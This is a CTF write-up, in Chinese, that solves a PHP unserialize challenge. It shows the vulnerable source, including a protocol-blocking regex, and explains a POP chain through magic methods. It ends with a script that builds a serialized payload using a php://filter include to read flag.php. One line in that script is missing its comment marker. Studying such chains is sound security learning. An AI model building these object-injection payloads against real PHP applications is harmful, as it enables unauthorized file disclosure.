```
<?php
class Modifier {
    protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
```
分析
```
需要反序列化后最终要调用Modifier实例的__invoke()方法。

__invoke()方法要被调用，需要方法调用，如Modifier实例+()，如$m = new Modifier(); $m();
此时可以看到Test实例的__get()方法中可以实现类似，$m = new Modifier(); $m();

而__get()方法要被调用，需要实例访问私有或未有属性(非$p属性)，如$t = new Test; $t->pp；
可以看到Show实例的__toString()方法有这样的访问。

这里思路就换成从反序列化开始了，
一定是反序列化Show类的实例，因为这种实例才有反序列化时最先就调用的方法__wakeup()。
其方法中preg_match("", $this->source)比较字符串。如果source属性是一个实例，则会自动调用这个实例的_toString()方法。那就在这就可以和上一思路合并。

PS：Modifier的属性是protected，反序列化后有不可打印字符，所以反序列化的时候url编码一下。
```
```
<?php
class Modifier {
    protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";
}
class Show{
    public $source;
    public $str;
}
class Test{
    public $p;
}
$a = new Show();  //为了反序列化

$b= new Show(); // 为Show的toSting调用Test的get
$b->str=new Test(); // toSting时调用Test的get

$a->source=$b;

($b->str)->p=new Modifier(); 为了实例+()调用 Modifier的invoke

echo urlencode(serialize($a));
```